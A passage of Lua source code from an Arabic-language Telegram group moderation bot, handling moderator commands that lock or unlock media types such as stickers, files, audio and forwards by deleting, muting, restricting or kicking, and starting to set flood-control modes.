elseif text == 'قفل المتحركه بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Animation"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل المتحركه بالتقييد ')
end,nil)   
elseif text == 'قفل المتحركه بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Animation"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل المتحركه بالكتم ')
end,nil)   
elseif text == 'قفل المتحركه بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Animation"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل المتحركه بالطرد ')
end,nil)   
elseif text == 'فتح المتحركه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Animation"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فتح المتحركه ')
end,nil)   
end
if text == 'قفل الالعاب' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:geam"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الالعاب ')
end,nil)   
elseif text == 'قفل الالعاب بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:geam"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الالعاب بالتقييد ')
end,nil)   
elseif text == 'قفل الالعاب بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:geam"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الالعاب بالكتم ')
end,nil)   
elseif text == 'قفل الالعاب بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:geam"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الالعاب بالطرد ')
end,nil)   
elseif text == 'فتح الالعاب' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:geam"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فتح الالعاب ')
end,nil)   
end
if text == 'قفل الاغاني' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Audio"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الاغاني ')
end,nil)   
elseif text == 'قفل الاغاني بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Audio"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الاغاني بالتقييد ')
end,nil)   
elseif text == 'قفل الاغاني بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Audio"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الاغاني بالكتم ')
end,nil)   
elseif text == 'قفل الاغاني بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Audio"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الاغاني بالطرد ')
end,nil)   
elseif text == 'فتح الاغاني' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Audio"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فتح الاغاني ')
end,nil)   
end
if text == 'قفل الصوت' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:vico"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الصوت ')
end,nil)   
elseif text == 'قفل الصوت بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:vico"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الصوت بالتقييد ')
end,nil)   
elseif text == 'قفل الصوت بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:vico"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الصوت بالكتم ')
end,nil)   
elseif text == 'قفل الصوت بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:vico"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الصوت بالطرد ')
end,nil)   
elseif text == 'فتح الصوت' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:vico"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فتح الصوت ')
end,nil)   
end
if text == 'قفل الكيبورد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Keyboard"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الكيبورد ')
end,nil)   
elseif text == 'قفل الكيبورد بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Keyboard"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الكيبورد بالتقييد ')
end,nil)   
elseif text == 'قفل الكيبورد بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Keyboard"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الكيبورد بالكتم ')  
end,nil)   
elseif text == 'قفل الكيبورد بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Keyboard"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الكيبورد بالطرد ')  
end,nil)   
elseif text == 'فتح الكيبورد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Keyboard"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فتح الكيبورد ')  
end,nil)   
end
if text == 'قفل الملصقات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الملصقات ')  
end,nil)   
elseif text == 'قفل الملصقات بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الملصقات بالتقييد ')  
end,nil)
elseif text == 'قفل الملصقات بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الملصقات بالكتم ')  
end,nil)   
elseif text == 'قفل الملصقات بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الملصقات بالطرد ')  
end,nil)   
elseif text == 'فتح الملصقات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Sticker"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فتح الملصقات ')  
end,nil)   
end
if text == 'قفل التوجيه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:forward"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل التوجيه ')  
end,nil)   
elseif text == 'قفل التوجيه بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:forward"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل التوجيه بالتقييد ')  
end,nil)
elseif text == 'قفل التوجيه بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:forward"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل التوجيه بالكتم ')  
end,nil)   
elseif text == 'قفل التوجيه بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:forward"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل التوجيه بالطرد ')  
end,nil)   
elseif text == 'فتح التوجيه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:forward"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فتح التوجيه ')  
end,nil)   
end
if text == 'قفل الملفات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Document"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الملفات ')  
end,nil)   
elseif text == 'قفل الملفات بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Document"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الملفات بالتقييد ')  
end,nil)
elseif text == 'قفل الملفات بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Document"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الملفات بالكتم ')  
end,nil)   
elseif text == 'قفل الملفات بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Document"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الملفات بالطرد ')  
end,nil)   
elseif text == 'فتح الملفات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Document"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فتح الملفات ')  
end,nil)   
end
if text == 'قفل السيلفي' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Unsupported"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل السيلفي ')  
end,nil)   
elseif text == 'قفل السيلفي بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Unsupported"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل السيلفي بالتقييد ')  
end,nil)
elseif text == 'قفل السيلفي بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Unsupported"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل السيلفي بالكتم ')  
end,nil)   
elseif text == 'قفل السيلفي بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Unsupported"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل السيلفي بالطرد ')  
end,nil)   
elseif text == 'فتح السيلفي' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Unsupported"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فتح السيلفي ')  
end,nil)   
end
if text == 'قفل الماركداون' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Markdaun"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ?? تـم قفـل الماركداون ')  
end,nil)   
elseif text == 'قفل الماركداون بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Markdaun"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الماركداون بالتقييد ')  
end,nil)
elseif text == 'قفل الماركداون بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Markdaun"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الماركداون بالكتم ')  
end,nil)   
elseif text == 'قفل الماركداون بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Markdaun"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الماركداون بالطرد ')  
end,nil)   
elseif text == 'فتح الماركداون' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Markdaun"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فتح الماركداون ')  
end,nil)   
end
if text == 'قفل الجهات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Contact"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الجهات ')  
end,nil)   
elseif text == 'قفل الجهات بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Contact"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الجهات بالتقييد ')  
end,nil)
elseif text == 'قفل الجهات بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Contact"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الجهات بالكتم ')  
end,nil)   
elseif text == 'قفل الجهات بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Contact"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الجهات بالطرد ')  
end,nil)   
elseif text == 'فتح الجهات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Contact"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فتح الجهات ')  
end,nil)   
end
if text == 'قفل الكلايش' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Spam"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الكلايش ')  
end,nil)   
elseif text == 'قفل الكلايش بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Spam"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الكلايش بالتقييد ')  
end,nil)
elseif text == 'قفل الكلايش بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Spam"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الكلايش بالكتم ')  
end,nil)   
elseif text == 'قفل الكلايش بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Spam"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الكلايش بالطرد ')  
end,nil)   
elseif text == 'فتح الكلايش' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Spam"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فتح الكلايش ')  
end,nil)   
end
if text == 'قفل التكرار بالطرد' and Mod(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'kick')  
send(msg.chat_id_, msg.id_,' ♤ تم قفل التكرار بالطرد')
elseif text == 'قفل التكرار' and Mod(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'del')  
send(msg.chat_id_, msg.id_,' ♤ تم قفل التكرار')
elseif text == 'قفل التكرار بالتقييد' and Mod(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'keed')  
